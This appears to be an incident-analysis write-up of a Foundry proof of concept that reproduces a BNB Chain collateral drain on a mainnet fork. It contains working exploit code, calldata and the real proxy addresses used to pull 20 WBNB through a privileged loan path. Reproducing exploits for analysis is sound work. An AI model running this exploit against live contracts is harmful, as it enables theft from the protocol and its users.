## Overview & Context

This proof-of-concept (PoC) reproduces the BNB Chain incident where an unprivileged adversary used the `BorrowerOperationsV6::sell` flow in combination with `TokenHolder::privilegedLoan` to drain WBNB collateral from the protocol’s collateral-holder without any active loan or enforced repayment. The PoC is implemented as a Foundry test suite that runs on a forked BNB Chain state immediately before the exploit block and demonstrates the same economic effect: protocol WBNB leaves the collateral-holder proxy and ends up under attacker control.

- **Goal:** Show that an unprivileged attacker can, starting from public chain state and standard transactions, trigger the privileged loan path to move collateral-holder WBNB to attacker-controlled accounts while the exploited loan remains inactive.
- **Relation to root cause:** The PoC directly exercises the vulnerability described in `root_cause.json` / `root_cause_report.md`: `BorrowerOperationsV6::sell` can route into `TokenHolder::privilegedLoan` even when `loans(0).active == false`, allowing a 20 WBNB drain from the collateral-holder proxy.

To run the PoC from the session root:

```bash
cd /home/wesley/TxRayExperiment/incident-202601041655/forge_poc
RPC_URL="<your_BNB_QuickNode_RPC>" forge test --via-ir -vvvvv
```

In the validator environment, `RPC_URL` is constructed from `artifacts/poc/rpc/chainid_rpc_map.json` and `.env` so that the tests run against a BNB Chain (chainid 56) mainnet fork.

## PoC Architecture & Key Contracts

The PoC lives under `forge_poc/` and centers on a single exploit test plus a small attacker-side helper contract:

- **`collateral_holder_proxy` (protocol):** `0x2EeD3DC9c5134C056825b12388Ee9Be04E522173`
- **`token_holder_proxy` (protocol):** `0x616B36265759517AF14300Ba1dD20762241a3828`
- **`wbnb_token` (canonical WBNB):** `0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c`
- **`external_wbnb_recipient` (non-attacker EOA):** `0x8432CD30C4d72Ee793399E274C482223DCA2bF9e`
- **`attacker` (local EOA):** Fresh address from `makeAddr("attacker")`
- **`AttackerHelper` (local contract):** Simulates the on-chain helper used in the incident, but is deployed locally from the attacker EOA.

The core contracts and test are defined in `forge_poc/test/Exploit.t.sol:1`:

```solidity
contract AttackerHelper {
    address public immutable collateralHolder;
    address public immutable tokenHolder;
    address public immutable attacker;

    function executeExploit(bytes calldata data) external {
        (bool ok, ) = tokenHolder.call(data);
        require(ok, "exploit call failed");
    }

    function sweepWBNB(IERC20 token) external {
        uint256 bal = token.balanceOf(address(this));
        if (bal > 0) {
            token.transfer(attacker, bal);
        }
    }
}
```

*Snippet 1 – Local attacker helper used to drive the exploit and later sweep WBNB profits to the attacker EOA.*

The `ExploitTest` contract sets up the fork, deploys `AttackerHelper` from the attacker EOA, and enforces oracle-aligned assertions:

```solidity
contract ExploitTest is Test {
    address constant collateral_holder_proxy = 0x2EeD3DC9c5134C056825b12388Ee9Be04E522173;
    address constant token_holder_proxy      = 0x616B36265759517AF14300Ba1dD20762241a3828;
    address constant wbnb_token              = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    address attacker;
    AttackerHelper attackerHelper;

    function setUp() public {
        string memory rpcUrl = vm.envString("RPC_URL");
        vm.createSelectFork(rpcUrl, 63856734);

        attacker = makeAddr("attacker");
        vm.deal(attacker, 10 ether);

        vm.startPrank(attacker);
        attackerHelper = new AttackerHelper(collateral_holder_proxy, token_holder_proxy, attacker, wbnb_token);
        vm.stopPrank();
    }
}
```

*Snippet 2 – Test setup: fork BNB Chain, create a fresh attacker EOA, fund it, and deploy the local helper.*

## Adversary Execution Flow

The PoC models an ACT-style lifecycle from an unprivileged attacker perspective:

1. **Environment setup and funding**
   - The test forks BNB Chain at block `63856734`, immediately before the exploit (`vm.createSelectFork(rpcUrl, 63856734)`).
   - A fresh attacker EOA is created via `makeAddr("attacker")` and funded with `10 ether` (BNB) for gas using `vm.deal`.
   - Core actors are labeled (`attacker_eoa`, `attacker_helper`, `collateral_holder_proxy`, `token_holder_proxy`, `external_wbnb_recipient`, `WBNB`) for human-readable traces.

2. **Exploited loan precondition**
   - The PoC defines `_isLoanActive(uint256 loanId)` that calls `collateral_holder_proxy.loans(loanId)` via `staticcall` and decodes the `active` flag.
   - In `setUp()` and again at the start of `testExploit()`, it checks that loanId 0 is inactive:

```solidity
function _isLoanActive(uint256 loanId) internal view returns (bool) {
    (bool ok, bytes memory ret) =
        collateral_holder_proxy.staticcall(abi.encodeWithSignature("loans(uint256)", loanId));
    require(ok && ret.length >= 32, "loan getter staticcall failed");
    uint256 word0;
    assembly {
        word0 := mload(add(ret, 0x20))
    }
    return word0 != 0;
}
```

*Snippet 3 – Helper to read the loan’s `active` flag, used to enforce the inactive-loan invariant before and after the exploit.*

3. **Helper deployment and configuration**
   - From the attacker EOA, `AttackerHelper` is deployed with pointers to the real collateral-holder proxy, token-holder proxy, attacker address, and WBNB token.
   - `AttackerHelper` stores a local `Loan` struct for `loanId 0` with `collateral.active = false`, mirroring the inactive-loan state described in the root-cause analysis.

4. **Exploit execution (privileged loan path)**
   - The PoC reconstructs the inner payload that drives the privileged loan using ABI-level encoding:

```solidity
function _buildPrivilegedLoanPayload() internal pure returns (bytes memory) {
    bytes4 selector = 0x99270154;
    uint256 amount = 20e18; // 20 WBNB of collateral, matching the incident drain.
    return abi.encodeWithSelector(selector, wbnb_token, amount);
}
```

*Snippet 4 – Inner payload that causes TokenHolder::privilegedLoan to move 20 WBNB of collateral.*

   - An outer calldata blob is then constructed to match the TokenHolder entry point invoked via `BorrowerOperationsV6::sell`:

```solidity
function _buildExploitCalldata(address helper) internal pure returns (bytes memory) {
    bytes memory inner = _buildPrivilegedLoanPayload();
    return abi.encodePacked(
        bytes4(0xd54c73bf),                // TokenHolder entry selector
        uint256(0),                        // loanId / unused
        uint256(0xc0),                     // offset to dynamic payload
        uint256(uint160(helper)),          // borrower / helper
        uint256(uint160(collateral_holder_proxy)),
        uint256(uint160(helper)),
        uint256(uint160(helper)),
        uint256(inner.length),
        inner,
        uint256(0)
    );
}
```

*Snippet 5 – Outer TokenHolder calldata reconstructed from ABI semantics (no raw incident hex), routing the privileged loan for 20 WBNB via the helper.*

   - In `_reproducerAttack`, the attacker EOA calls the helper to execute this calldata against the token-holder proxy, which in turn routes through `BorrowerOperationsV6::sell` and `TokenHolder::privilegedLoan` on mainnet state:

```solidity
function _reproducerAttack() internal {
    bytes memory data = _buildExploitCalldata(address(attackerHelper));

    vm.prank(attacker);
    attackerHelper.executeExploit(data);

    vm.prank(attacker);
    attackerHelper.sweepWBNB(WBNB);
}
```

*Snippet 6 – ACT sequence in code: attacker triggers the exploit via the helper, then sweeps WBNB profit from helper to the attacker EOA.*

5. **Profit realization and invariant checks**
   - `testExploit()` measures WBNB balances before and after the exploit for both the attacker and collateral-holder, enforcing the oracle constraints:

```solidity
function testExploit() public {
    bool isActiveBefore = _isLoanActive(0);
    assertFalse(isActiveBefore);

    uint256 attackerWbnbBefore = WBNB.balanceOf(attacker);
    uint256 collateralHolderWbnbBefore = WBNB.balanceOf(collateral_holder_proxy);

    _reproducerAttack();

    uint256 attackerWbnbAfter = WBNB.balanceOf(attacker);
    uint256 collateralHolderWbnbAfter = WBNB.balanceOf(collateral_holder_proxy);

    assertEq(address(WBNB), wbnb_token);

    bool isActiveAfter = _isLoanActive(0);
    assertFalse(isActiveAfter);

    assertGt(attackerWbnbAfter, attackerWbnbBefore + 1e18);
    assertLt(collateralHolderWbnbAfter + 1e18, collateralHolderWbnbBefore);
}
```

*Snippet 7 – Main exploit test: enforces canonical WBNB address, inactive-loan invariant, attacker profit, and collateral-holder depletion.*

## Oracle Definitions and Checks

The PoC is guided by `artifacts/poc/oracle_generator/oracle_definition.json`, which specifies variables, pre-checks, and oracle constraints. The refined test maps each oracle to concrete assertions:

- **Variables:**
  - `attacker`: implemented as `attacker = makeAddr("attacker")`, a fresh EOA.
  - `collateral_holder_proxy`: constant `0x2eed...` used for balance and storage checks.
  - `token_holder_proxy`: constant `0x616b...` used as the target for the exploit call.
  - `wbnb_token`: constant `0xbb4c...` referenced via the `IERC20 WBNB` handle.
  - `external_wbnb_recipient`: constant `0x8432...`, labeled but not attacker-controlled.

- **Pre-checks:**
  1. **Collateral-holder liquidity:**  
     - Oracle: collateral-holder must have at least 20 WBNB before the exploit.  
     - Implementation: in `setUp()`, the test reads `WBNB.balanceOf(collateral_holder_proxy)` and asserts `>= 20e18`.
  2. **Inactive loan record:**  
     - Oracle: loanId 0 must be inactive before the exploit.  
     - Implementation: `_isLoanActive(0)` is called in `setUp()` and at the start of `testExploit()`, and `assertFalse(isActiveBefore)` enforces this condition.

- **Hard constraints:**
  1. **Canonical WBNB address (`hard_asset_type_wbnb`):**  
     - Oracle: WBNB must be the canonical token at `0xbb4c...`.  
     - Implementation: `assertEq(address(WBNB), wbnb_token)` inside `testExploit()`.
  2. **Inactive-loan invariant (`hard_inactive_loan_invariant`):**  
     - Oracle: the exploited loan record must remain inactive after the exploit.  
     - Implementation: `bool isActiveAfter = _isLoanActive(0); assertFalse(isActiveAfter);` in `testExploit()`.

- **Soft constraints:**
  1. **Attacker profit in WBNB (`soft_attacker_profit_wbnb`):**  
     - Oracle: attacker must gain strictly more WBNB, with at least 1 WBNB directional profit.  
     - Implementation: `assertGt(attackerWbnbAfter, attackerWbnbBefore + 1e18);` after `_reproducerAttack()`.
  2. **Collateral-holder depletion (`soft_victim_depletion_collateral_holder`):**  
     - Oracle: collateral-holder must lose at least 1 WBNB of WBNB balance.  
     - Implementation: `assertLt(collateralHolderWbnbAfter + 1e18, collateralHolderWbnbBefore);`.

Together, these checks treat the JSON oracles as a specification for success and verify that the PoC’s behavior matches both the storage and balance-level invariants.

## Validation Result and Robustness

The validator reran the PoC using:

```bash
cd /home/wesley/TxRayExperiment/incident-202601041655/forge_poc
RPC_URL="<BNB_QuickNode_RPC>" forge test --via-ir -vvvvv \
  > /home/wesley/TxRayExperiment/incident-202601041655/artifacts/poc/poc_validator/forge-test.log 2>&1
```

Key points from `artifacts/poc/poc_validator/forge-test.log`:

- All tests pass: `ExploitTest.testExploit` and the auxiliary `Counter` tests are successful.
- The trace shows WBNB transfers from the collateral-holder proxy to the token-holder proxy and then to the attacker EOA and helper, ending with 19.2 WBNB under attacker control and ~0.8 WBNB routed through the helper in a way that mirrors the incident.
- A post-exploit staticcall to `collateral_holder_proxy.loans(0)` confirms that the loan record has `active: false`, as required by the oracle and root-cause analysis.

The final validator result is captured in `artifacts/poc/poc_validator/poc_validated_result.json` with:

- `overall_status: "Pass"`
- All correctness and quality checks marked as `passed: true`, including:
  - `passes_validation_oracles`
  - `oracle_alignment_with_definition`
  - `human_readable_and_labeled`
  - `no_magic_numbers_and_values_are_derived`
  - `mainnet_fork_no_local_mocks`
  - `self_contained_no_attacker_side_artifacts` (all subfields)
  - `end_to_end_attack_process_described`
  - `alignment_with_root_cause`

This means the PoC is robust, self-contained, and aligned with both the oracle specification and the incident’s economic behavior.

## Linking PoC Behavior to Root Cause

The PoC concretely demonstrates the protocol bug identified in `root_cause.json` and `root_cause_report.md`:

- **Exercising the vulnerable path:**
  - The exploit call initiated by the attacker EOA through `AttackerHelper.executeExploit` reaches `BorrowerOperationsV6::sell` via the real collateral-holder proxy (`0x2eed...`) and then `TokenHolder::privilegedLoan` through the real token-holder proxy (`0x616b...`).
  - The call moves 20 WBNB from the collateral-holder to the token-holder and then to attacker-controlled addresses, just as described in the root-cause traces (20 WBNB drained, with 0.8 WBNB and 19.2 WBNB legs).

- **Inactive-loan invariant preserved:**
  - `_isLoanActive(0)` shows that loanId 0 is inactive before the exploit (`active == false`) and remains inactive afterwards, confirming that the privilege path is available even when no legitimate loan is open.
  - This matches the root cause: a flawed integration between BorrowerOperationsV6 and TokenHolder allows privileged collateral movement without enforcing loan activity or repayment.

- **Victim loss and attacker profit:**
  - The PoC asserts a strictly positive WBNB delta for the attacker and a strictly negative WBNB delta for the collateral-holder, ensuring economic alignment with the incident’s success predicate (attacker net gain of ~19.075 WBNB and protocol loss of 20 WBNB).
  - Trace excerpts show the collateral-holder balance decreasing and attacker balances increasing in WBNB, confirming the ACT profit condition.

- **ACT framing:**
  - **Adversary-crafted:** The attacker EOA and `AttackerHelper` mimic the real deployment and exploit leg, sending parameterized calldata into protocol proxies.
  - **Collateral-holder / Token-holder (victim-observed):** The protocol contracts observe and execute `sell` and `privilegedLoan` as if they were legitimate internal flows, but end up transferring collateral to attacker-controlled recipients.
  - **Success predicate:** The PoC uses the oracles to formally encode the success predicate: canonical WBNB asset, inactive-loan invariant, attacker WBNB profit, and victim collateral depletion.

Overall, the refined PoC not only replays the exploit conditions in a self-contained test environment but also makes the root cause explicit through storage and balance assertions. It provides a clear, reproducible demonstration of how an unprivileged attacker can drain WBNB collateral by abusing the privileged loan path while the relevant loan remains inactive.

